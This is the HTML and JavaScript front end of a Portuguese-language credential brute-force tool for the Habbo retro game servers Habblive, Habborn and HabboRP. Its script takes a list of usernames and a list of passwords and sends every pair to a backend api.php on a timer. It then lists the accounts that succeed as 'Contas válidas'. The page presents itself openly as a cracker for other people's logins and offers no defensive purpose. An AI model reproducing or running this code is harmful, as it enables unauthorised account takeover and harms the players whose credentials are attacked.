<html>
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>FuckRetros ~ BruteForce </title>
    <link href="style/reboot13.css" rel="stylesheet" id="bootstrap-css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.js" type="text/javascript"></script>

    <meta property="og:url" content="http://fuckretros.rf.gd/" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="BruteForce" />
	<meta property="og:description" content="Aplicação que força varias senhas em logins dos hotéis mais famosos até achar a certa, faça sua própria wordlist ou vá com uma já pronta e usada pela maioria da internet em 2019." />
	<meta property="og:image" content="https://i.imgur.com/6kFqssT.png" />
	<meta property="og:site_name" content="FuckRetros ~ BruteForce" />
    
</head>
<body>

<center>
        <div class="row col-md-12">
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
<div class="card col-sm-12">
  <h1 class="card-body h6">
    <center>
      <strong>BruteForce</a></strong>
      </center>
       <button id="mostra" class="btn btn-primary">Mostrar/Esconder</button>
    </h1>
				<div id="form-check">
    
					<label> <input type="radio" name="radio" id="hlive" value="habblive"> <span class="label-text" id="hlive-radio" name="habblive-1">Habblive</span> </label>
                    &nbsp&nbsp&nbsp
                    <label> <input type="radio" name="radio" id="born" value="habborn"> <span class="label-text" name="habborn">Habborn</span> </label>
                    &nbsp&nbsp&nbsp
                    <label> <input type="radio" name="radio" id="hrp" value="habborp"> <span class="label-text" name="habborp">HabboRP</span> </label>
				</div>
                                
                <style>
                button[id="mostra"]
                {
                    float: right;
                    margin-top: -15px;
                }
                h1
                {
                    font: 15pt;
                }
                </style>

                <script type="text/javascript">
                    $("#form-check").slideToggle();
                    $('#mostra').click(function(){
                    $("#form-check").slideToggle();
                    });
                </script>

  <div class="card-body">
<div class="md-form">
    <div class="col-md-12">
        <span>Válido:</span>&nbsp<span id="cLive" class="badge badge-success">0</span>
    <span>Inválido:</span>&nbsp<span id="cDie" class="badge badge-danger"> 0</span>
    <span>Checados:</span>&nbsp<span id="total" class="badge badge-info">0</span>
    <span>Total:</span>&nbsp<span id="carregadas" class="badge badge-dark">0</span>&nbsp;<br>&nbsp;<br>

  <textarea type="text" style="text-align: center;" id="lista-users" class="md-textarea form-control" rows="4" placeholder="Usuários"></textarea>&nbsp;
  <textarea type="text" style="text-align: center;" id="lista-pass" class="md-textarea form-control" rows="4" placeholder="Senhas"></textarea>&nbsp;
  <center>
<button class="btn btn-primary" style="width: 200px; outline: none;" id="submit_bruteforce">Iniciar</button>
 </center>
 
<script>
$(document).ready(function(){
    $('#submit_clear').click(function() {
        document.getElementById('lista-users').value = "";
        document.getElementById('lista-pass').value = "";
    });
});

</script>

 </center>

</div>
</div>
&nbsp;<br>

</div>


</div>
</div>
</div>
    </div>
&nbsp;<br>&nbsp;<br>&nbsp;<br>
<div class="col-md-12">
<div class="card">
<div style="position: absolute;
        top: 0;
        right: 0;">

</div>
  <div class="card-body">
    <h6 style="font-weight: bold;" class="card-title">Contas válidas - <span  id="cLive2" class="badge badge-success">0</span></h6>
    <div id="bode"><span id=".aprovadas" class="aprovadas"></span>
</div>
  </div>
</div>
</div>

<br>
<br>
<br>

<div class="col-md-12">
<div class="card">
    <div style="position: absolute;
        top: 0;
        right: 0;">
</div>
  <div class="card-body">
    <h6 style="font-weight: bold;" class="card-title">Contas inválidas - <span id="cDie2" class="badge badge-danger">0</span></h6>
    <div id="bode2"><span id=".reprovadas" class="reprovadas"></span>
    </div>
  </div>
</div>
</div>
  </div>
</div>
</div>
<br>
</center>

<script>
    
    function checkEmpty(string)
    {
        if (string == "")
        {
            alert(`Campo vazio!`)
            return "empty";
        }

    }


            $(document).ready(function(){

            hotel = "indefinido";

            $('#submit_bruteforce').click(function() {

                if ($("input[id='hlive']:checked").val()) {

                    hotel = "habblive";   
                }
                
                else if ($("input[id='born']:checked").val()) 
                {
                    hotel = "habborn";
                }

                else if ($("input[id='hrp']:checked").val()) 
                {
                    hotel = "habborp";
                }

                else 
                {
                    alert("Você precisa informar o hotel que você quer antes de iniciar o bruteforce.")
                    return;
                }

                var linha = $("#lista-users").val();
                var linhaenviar = linha.split("\n");
                var total = linhaenviar.length;
                var checker = checkEmpty(linhaenviar);
        
                if(checker == "empty")
                {
                    return;
                }

                var linha2 = $("#lista-pass").val();
                var linhaenviar2 = linha2.split("\n");

                var checker2 = checkEmpty(linhaenviar2);
                if(checker2 == "empty")
                {
                    return;
                }

                var ap = 0;
                var ed = 0;
                var rp = 0;
                var crackeds = 0;

                linhaenviar.forEach(function(value, index) {
                    linhaenviar2.forEach(function(value2, index2) {
                        setTimeout(
                            function enviar() {
                                $.ajax({
                                    url: 'api.php?usuario=' + value + '&senha=' + value2 + "&hotel=" + hotel,
                                    type: 'GET',
                                    async: true,
                                    success: function(resultado) {
                                        if (resultado.match("#Approved")) 
                                        {
                                            ap++;
                                            aprovadas(resultado + "");
                                            crackeds++;
                                        }
                                        else 
                                        {
                                            rp++;
                                            reprovadas(resultado + "");
                                        }

                            $('#carregadas').html(total);
                            var fila = parseInt(ap) + parseInt(rp);
                            $('#cLive').html(ap);
                            $('#cWarn').html(ed);
                            $('#cDie').html(rp);
                            $('#total').html(fila);
                            $('#cLive2').html(ap);
                            $('#cWarn2').html(ed);
                            $('#cDie2').html(rp);
                        }
                    });
                }, 2500 * index);
            });
        });
    });
});

        function aprovadas(str) {
            $(".aprovadas").append(str + "<br>");
        }
        function reprovadas(str) {
            $(".reprovadas").append(str + "<br>");
        }
    
</script>


<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.4/umd/popper.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.5.11/js/mdb.min.js"></script>
</body>

</html>

<style>
@import url("https://use.fontawesome.com/releases/v5.0.11/css/all.css");

body{
	padding: 50px;
}

label{
	position: relative;
	cursor: pointer;
	color: #666;
	font-size: 30px;
}

input[type="checkbox"], input[type="radio"]{
	position: absolute;
	right: 9000px;
}

/*Check box*/
input[type="checkbox"] + .label-text:before{
	content: "\f0c8";
	font-family: "Font Awesome 5 Free";
	speak: none;
	font-style: normal;
	font-variant: normal;
	text-transform: none;
	line-height: 1;
	-webkit-font-smoothing:antialiased;
	width: 1em;
	display: inline-block;
	margin-right: 5px;
}

habblive
{
    margin-left: 100px;
}

input[type="checkbox"]:checked + .label-text:before{
	content: "\f14a";
	color: #2980b9;
	animation: effect 250ms ease-in;
	font-weight: 900;
}

input[type="checkbox"]:disabled + .label-text{
	color: #aaa;
}

input[type="checkbox"]:disabled + .label-text:before{
	content: "\f0c8";
	color: #ccc;
}


input[type="radio"] + .label-text:before{
	content: "\f111";
	font-family: "Font Awesome 5 Free";
	speak: none;
	font-style: normal;
	font-variant: normal;
	text-transform: none;
	line-height: 1;
	-webkit-font-smoothing:antialiased;
	width: 1em;
	display: inline-block;
	margin-right: 5px;
}

input[type="radio"]:checked + .label-text:before{
	content: "\f192";
	color: #8e44ad;
	animation: effect 250ms ease-in;
}

input[type="radio"]:disabled + .label-text{
	color: #aaa;
}

input[type="radio"]:disabled + .label-text:before{
	content: "\f111";
	color: #ccc;
}


.toggle input[type="radio"] + .label-text:before{
	content: "\f204";
	font-family: "Font Awesome 5 Free";
	speak: none;
	font-style: normal;
	font-weight: 900;
	font-variant: normal;
	text-transform: none;
	line-height: 1;
	-webkit-font-smoothing:antialiased;
	width: 1em;
	display: inline-block;
	margin-right: 10px;
}

.toggle input[type="radio"]:checked + .label-text:before{
	content: "\f205";
	color: #16a085;
	animation: effect 250ms ease-in;
}

.toggle input[type="radio"]:disabled + .label-text{
	color: #aaa;
}

.toggle input[type="radio"]:disabled + .label-text:before{
	content: "\f204";
	color: #ccc;
}


@keyframes effect{
	0%{transform: scale(0);}
	25%{transform: scale(1.3);}
	75%{transform: scale(1.4);}
	100%{transform: scale(1);}
}

</style>